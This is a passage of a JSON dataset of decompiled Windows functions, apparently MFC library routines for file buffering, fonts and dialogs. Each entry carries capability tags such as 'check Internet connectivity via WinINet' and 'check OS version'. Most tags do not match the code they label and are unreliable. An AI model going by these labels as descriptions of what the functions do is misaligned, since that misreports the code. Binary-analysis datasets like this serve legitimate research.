        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004300e2(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    iVar1 = fcn.0043883e();\n    if ((*(iVar1 + 0x18) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042f7f2(0x433696);\n        iVar3 = fcn.0042f804(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00430f07(0x4401a4, 0x4388af, 0x438887, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x18) = uVar4;\n        fcn.0042f7f2(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x18);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 365
    },
    "00430865": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00430865(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (arg_ch == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_10h != 0) {\n            do {\n                arg_10h = arg_10h + -1;\n                arg_ch = fcn.00419ad5(arg_ch, arg_14h);\n                if (arg_ch == 0) {\n                    fcn.00401c80();\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n            } while (arg_10h != 0);\n        }\n        iVar2 = fcn.00419ad5(arg_ch, arg_14h);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_ch);\n        }\n        else {\n            iVar2 = iVar2 - arg_ch;\n        }\n        uVar1 = fcn.0040f184(iVar2, arg_ch, iVar2);\n        fcn.00419370(uVar1, iVar2, arg_ch);\n        fcn.0040f065(0xffffffff);\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 305
    },
    "004309f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004309f1(int32_t param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        for (; param_1 != 0; param_1 = *(param_1 + 0x10)) {\n            if (param_1 == param_2) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 92
    },
    "00430b34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00430b34(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    bVar6 = *(arg_8h + 2) == -1;\n    iVar2 = fcn.00430ae9(arg_8h);\n    iVar3 = fcn.00430a6a(arg_8h);\n    if (iVar3 != 0) {\n        iVar2 = iVar2 + (bVar6 * 2 + 1) * 2;\n        iVar3 = fcn.00419cfd(iVar2);\n        iVar2 = iVar2 + 2 + iVar3 * 2;\n    }\n    if (bVar6) {\n        uVar1 = *(arg_8h + 0x10);\n    }\n    else {\n        uVar1 = *(arg_8h + 8);\n    }\n    if (uVar1 != 0) {\n        uVar5 = uVar1;\n        do {\n            puVar4 = (iVar2 + 3U & 0xfffffffc) + (-bVar6 & 6) + 0x12;\n            if (*puVar4 == 0xffff) {\n                puVar4 = puVar4 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                } while (uVar1 != 0);\n            }\n            if (*puVar4 == 0xffff) {\n                puVar4 = puVar4 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                } while (uVar1 != 0);\n            }\n            uVar1 = *puVar4;\n            if ((uVar1 != 0) && (!bVar6)) {\n                uVar1 = uVar1 - 2;\n            }\n            uVar5 = uVar5 - 1;\n            iVar2 = puVar4 + uVar1 + 2;\n        } while (uVar5 != 0);\n    }\n    return iVar2 - arg_8h;\n}\n",
        "token_count": 511
    },
    "00430bf7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430bf7(uint lpMultiByteStr, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint32_t arg_ch_00;\n    uint *in_ECX;\n    int32_t iVar6;\n    int16_t iVar7;\n    uint32_t arg_8h;\n    bool bVar8;\n    uint var_54h;\n    uint hMem;\n    uint var_4ch;\n    uint var_48h;\n    uint lpWideCharStr;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    if (in_ECX[1] != 0) {\n        puVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*in_ECX);\n        bVar8 = *(puVar2 + 2) == -1;\n        iVar3 = fcn.00430a6a(puVar2);\n        iVar1 = bVar8 * 2 + 1;\n        if (bVar8) {\n            puVar2[3] = puVar2[3] | 0x40;\n        }\n        else {\n            *puVar2 = *puVar2 | 0x40;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpMultiByteStr);\n        if (iVar4 < 0x20) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, &lpWideCharStr, 0x20)\n            ;\n            iVar4 = iVar1 * 2 + iVar4 * 2;\n            puVar5 = fcn.00430ae9(puVar2);\n            iVar6 = 0;\n            if (iVar3 != 0) {\n                iVar3 = fcn.00419cfd(puVar5 + iVar1);\n                iVar6 = iVar1 * 2 + 2 + iVar3 * 2;\n            }\n            arg_ch_00 = iVar6 + 3 + puVar5 & 0xfffffffc;\n            arg_8h = puVar5 + iVar4 + 3 & 0xfffffffc;\n            if (bVar8) {\n                iVar7 = *(puVar2 + 4);\n            }\n            else {\n                iVar7 = *(puVar2 + 2);\n            }\n            if ((iVar4 != iVar6) && (iVar7 != 0)) {\n                fcn.00418360(arg_8h, arg_ch_00, puVar2 + (in_ECX[1] - arg_ch_00));\n            }\n            *puVar5 = arg_ch;\n            fcn.00418360(puVar5 + iVar1, &lpWideCharStr, iVar4 + iVar1 * -2);\n            in_ECX[1] = in_ECX[1] + (arg_8h - arg_ch_00);\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*in_ECX);\n            in_ECX[2] = 0;\n        }\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 703
    },
    "00430d2f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430d2f(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    char *lpMultiByteStr;\n    uint var_44h;\n    int32_t lpvObject;\n    uint var_24h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    uVar4 = 10;\n    var_4h = *0x44d270;\n    lpMultiByteStr = \"System\";\n    iVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0xd);\n        if (iVar2 == 0) goto code_r0x00430da8;\n    }\n    iVar2 = (*_sym.imp.GDI32.dll_GetObjectA)(iVar2, 0x3c, &lpvObject);\n    if (iVar2 != 0) {\n        lpMultiByteStr = &var_24h;\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(0);\n        if (lpvObject < 0) {\n            lpvObject = -lpvObject;\n        }\n        uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar3, 0x5a);\n        uVar4 = (*_sym.imp.KERNEL32.dll_MulDiv)(lpvObject, 0x48, uVar4);\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar3);\n    }\ncode_r0x00430da8:\n    if (arg_8h == 0) {\n        arg_8h = uVar4;\n    }\n    fcn.00430bf7(lpMultiByteStr, arg_8h);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 423
    },
    "0043104d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043104d(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != 0) {\n        var_8h = -(*(param_1 + 0x44) != 0);\n        while (var_8h != 0) {\n            fcn.0042a704(&var_8h, &var_ch, &var_4h);\n            puVar1 = *(param_1 + 0x58) + var_4h;\n            *puVar1 = 0;\n            if (*(param_1 + 0x5c) == 2) {\n                puVar1[1] = 0;\n            }\n            (**(param_1 + 0x18))(var_4h);\n        }\n        fcn.0042a60e();\n        fcn.00417bef();\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "004310b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004310b0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    iVar1 = fcn.0043883e();\n    if ((*(iVar1 + 0x10) != 0) && (iVar2 = *(iVar1 + 0x10) + -1,  *(iVar1 + 0x10) = iVar2,  iVar2 == 0)) {\n        if (arg_8h != 0) {\n            if (((arg_8h != -1) && (iVar2 = fcn.0042fa75(),  iVar2 != 0)) && (*(iVar2 + 0x38) != NULL)) {\n                (**(iVar2 + 0x38))(0, 0);\n            }\n            fcn.0043104d();\n            fcn.0043104d();\n            fcn.0043104d();\n            fcn.0043104d();\n            fcn.0043104d();\n        }\n        iVar2 = fcn.00438818();\n        iVar2 = *(iVar2 + 4);\n        iVar3 = fcn.00438afb();\n        if ((((iVar3 != 0) && (iVar2 != 0)) &&\n            ((*(iVar3 + 0xc) == 0 || (uVar4 = fcn.00419e0a(*(iVar3 + 0xc)),  uVar4 < *(iVar2 + 0x94))))) &&\n           (*(iVar2 + 0x94) != 0)) {\n            arg_8h = 0;\n            if (*(iVar3 + 0xc) != 0) {\n                arg_8h = fcn.00419e0a(*(iVar3 + 0xc));\n                fcn.00418911(*(iVar3 + 0xc));\n            }\n            iVar2 = fcn.004188ff(*(iVar2 + 0x94));\n            *(iVar3 + 0xc) = iVar2;\n            if ((iVar2 == 0) && (arg_8h != 0)) {\n                uVar5 = fcn.004188ff(arg_8h);\n                *(iVar3 + 0xc) = uVar5;\n            }\n        }\n    }\n    return *(iVar1 + 0x10) != 0;\n}\n",
        "token_count": 530
    },
    "004314da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004314da(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFile.0;\n    *(unaff_EBP + -4) = 0;\n    if ((extraout_ECX[1] != 0xffffffff) && (extraout_ECX[2] != NULL)) {\n        fcn.00431439();\n    }\n    fcn.004014f0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 192
    },
    "00431c31": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00431c31(int32_t param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t arg_10h;\n    \n    if (param_1 != 0) {\n        arg_10h = param_1;\n        arg_8h = fcn.004318c6(param_1, param_1, param_2);\n        fcn.00431beb(arg_8h, param_1, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "004324e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004324e6(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    iVar1 = fcn.0043883e();\n    if ((*(iVar1 + 0x1c) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042f7f2(0x433696);\n        iVar3 = fcn.0042f804(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00430f07(0x43e55c, 0x4370d5, 0x438887, 4, 2);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x1c) = uVar4;\n        fcn.0042f7f2(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x1c);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 369
    },
    "004325d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004325d8(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CDC.0;\n    if (param_1[1] != NULL) {\n        uVar1 = fcn.004325a7();\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "004327cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004327cd(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    iVar1 = fcn.0043883e();\n    if ((*(iVar1 + 0x20) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042f7f2(0x433696);\n        iVar3 = fcn.0042f804(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00430f07(0x43e4bc, 0x4370f1, 0x438887, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x20) = uVar4;\n        fcn.0042f7f2(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x20);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 365
    },
    "00432fdd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00432fdd(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch == 0) || (arg_8h == 0)) {\n        iVar1 = 0;\n    }\n    else {\n        if ((*(in_ECX + 0x18) & 1) == 0) {\n            fcn.0043381c(4, *(in_ECX + 0x14));\n        }\n        uVar3 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < uVar3) {\n            uVar3 = arg_ch;\n        }\n        fcn.00419370(arg_8h, *(in_ECX + 0x28), uVar3);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar3;\n        arg_8h = arg_8h + uVar3;\n        uVar3 = arg_ch - uVar3;\n        if (uVar3 != 0) {\n            iVar1 = uVar3 - uVar3 % *(in_ECX + 0x20);\n            var_8h = 0;\n            var_4h = iVar1;\n            do {\n                iVar2 = (**(**(in_ECX + 0x24) + 0x34))(arg_8h, var_4h);\n                arg_8h = arg_8h + iVar2;\n                var_8h = var_8h + iVar2;\n                var_4h = var_4h - iVar2;\n                if (iVar2 == 0) break;\n            } while (var_4h != 0);\n            uVar3 = uVar3 - var_8h;\n            if ((uVar3 != 0) && (var_8h == iVar1)) {\n                uVar4 = 0;\n                if (*(in_ECX + 8) == 0) {\n                    if ((*(in_ECX + 0xc) != 0) || (var_4h = *(in_ECX + 0x20),  *(in_ECX + 0x20) < uVar3)) {\n                        var_4h = uVar3;\n                    }\n                    var_8h = *(in_ECX + 0x30);\n                    do {\n                        iVar1 = (**(**(in_ECX + 0x24) + 0x34))(var_8h, var_4h);\n                        var_8h = var_8h + iVar1;\n                        var_4h = var_4h - iVar1;\n                        uVar4 = uVar4 + iVar1;\n                        if ((iVar1 == 0) || (var_4h == 0)) break;\n                    } while (uVar4 < uVar3);\n                    iVar1 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x2c) = iVar1 + uVar4;\n                }\n                else {\n                    (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                    iVar1 = *(in_ECX + 0x30);\n                }\n                uVar4 = *(in_ECX + 0x2c) - iVar1;\n                *(in_ECX + 0x28) = iVar1;\n                if (uVar3 < uVar4) {\n                    uVar4 = uVar3;\n                }\n                fcn.00419370(arg_8h, iVar1, uVar4);\n                *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar4;\n                uVar3 = uVar3 - uVar4;\n            }\n        }\n        iVar1 = arg_ch - uVar3;\n    }\n    return iVar1;\n}\n",
        "token_count": 930
    },
    "00433181": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433181(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t iVar4;\n    uint unaff_ESI;\n    int32_t iVar6;\n    uint var_8h;\n    uint32_t var_4h;\n    uint32_t uVar5;\n    \n    if ((*(in_ECX + 0x18) & 1) != 0) {\n        uVar5 = *(in_ECX + 0x28);\n        piVar1 = in_ECX + 0x2c;\n        var_4h = *piVar1 - uVar5;\n        uVar2 = arg_8h + var_4h;\n        if (*(in_ECX + 8) == 0) {\n            arg_8h_00 = *(in_ECX + 0x30);\n            if (arg_8h_00 < uVar5) {\n                if (0 < var_4h) {\n                    fcn.00418360(arg_8h_00, uVar5, var_4h);\n                    arg_8h_00 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x28) = arg_8h_00;\n                    *piVar1 = arg_8h_00 + var_4h;\n                }\n                uVar5 = arg_8h;\n                if (*(in_ECX + 0xc) == 0) {\n                    uVar5 = *(in_ECX + 0x20);\n                }\n                iVar4 = uVar5 - var_4h;\n                iVar6 = var_4h + arg_8h_00;\n                do {\n                    iVar3 = (**(**(in_ECX + 0x24) + 0x34))(iVar6, iVar4);\n                    var_4h = var_4h + iVar3;\n                    iVar6 = iVar6 + iVar3;\n                    iVar4 = iVar4 - iVar3;\n                    if ((iVar3 == 0) || (iVar4 == 0)) break;\n                } while (var_4h < arg_8h);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n                *(in_ECX + 0x2c) = *(in_ECX + 0x30) + var_4h;\n            }\n        }\n        else {\n            if (var_4h != 0) {\n                (**(**(in_ECX + 0x24) + 0x28))(-var_4h, -var_4h >> 0x1f, 1);\n            }\n            (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, piVar1);\n            *(in_ECX + 0x28) = *(in_ECX + 0x30);\n        }\n        if (uVar2 <= *(in_ECX + 0x2c) - *(in_ECX + 0x28)) {\n            return;\n        }\n        unaff_EBX = 0;\n        unaff_ESI = 3;\n    }\n    fcn.0043381c(unaff_ESI, unaff_EBX);\n    return;\n}\n",
        "token_count": 763
    },
    "00433277": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433277(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        if ((~*(in_ECX + 0x18) & 1) == 0) {\n            fcn.0043381c(2, *(in_ECX + 0x14));\n        }\n        arg_10h = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < arg_10h) {\n            arg_10h = arg_ch;\n        }\n        fcn.00419370(*(in_ECX + 0x28), arg_8h, arg_10h);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + arg_10h;\n        arg_ch = arg_ch - arg_10h;\n        if (arg_ch != 0) {\n            fcn.0043310a();\n            iVar1 = arg_ch - arg_ch % *(in_ECX + 0x20);\n            (**(**(in_ECX + 0x24) + 0x38))(arg_8h + arg_10h, iVar1);\n            if (*(in_ECX + 8) != 0) {\n                (**(**(in_ECX + 0x24) + 0x50))(1, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n            }\n            fcn.00419370(*(in_ECX + 0x28), arg_8h + arg_10h + iVar1, arg_ch - iVar1);\n            *(in_ECX + 0x28) = *(in_ECX + 0x28) + (arg_ch - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 468
    },
    "00433383": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00433383(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    if ((*(extraout_ECX + 0x24) != 0) && ((*(extraout_ECX + 0x18) & 2) == 0)) {\n        fcn.00433269();\n    }\n    fcn.00432f9b();\n    fcn.004014f0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 201
    },
    "004334d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004334d9(int32_t hWnd, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint lpClassName;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    if ((hWnd != 0) && (uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar1 & 0xf) == arg_ch)) {\n        (*_sym.imp.USER32.dll_GetClassNameA)(hWnd, &lpClassName, 10);\n        (*_sym.imp.KERNEL32.dll_lstrcmpiA)(&lpClassName, \"combobox\");\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 166
    },
    "00433920": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433920(int32_t param_1)\n\n{\n    if (*(param_1 + 0x54) != 0) {\n    // WARNING: Could not recover jumptable at 0x0043392b. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(param_1 + 0x54) + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "004339d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004339d9(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.004015c0();\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x120))();\n        if ((iVar2 != 0) && (piVar1[0x1f] != 0)) {\n    // WARNING: Could not recover jumptable at 0x004339ff. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(*piVar1[0x1f] + 100))();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00433bd7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00433b0a)\n// WARNING: Removing unreachable block (ram,0x00433b5b)\n\nvoid fcn.00433bd7(uint param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [259];\n    uchar uStack9;\n    uint uStack8;\n    \n    uStack8 = 0x433bdf;\n    iVar4 = fcn.00438818();\n    if (*(iVar4 + 4) != NULL) {\n    // WARNING: Could not recover jumptable at 0x00433beb. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(iVar4 + 4) + 0x98))();\n        return;\n    }\n    uStack8 = *0x44d270;\n    fcn.004339d9(0);\n    iVar4 = fcn.00433a06(0, &stack0xfffffef0);\n    if (iVar4 != iStack272) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iVar4, 1);\n    }\n    if ((iVar4 == 0) || (piVar1 = (*_sym.imp.USER32.dll_SendMessageA)(iVar4, 0x376, 0, 0),  piVar1 == NULL)) {\n        piVar1 = NULL;\n    }\n    iStack276 = 0;\n    if ((piVar1 != NULL) && (iStack276 = *piVar1,  param_3 != 0)) {\n        *piVar1 = param_3 + 0x30000;\n    }\n    if (((param_2 & 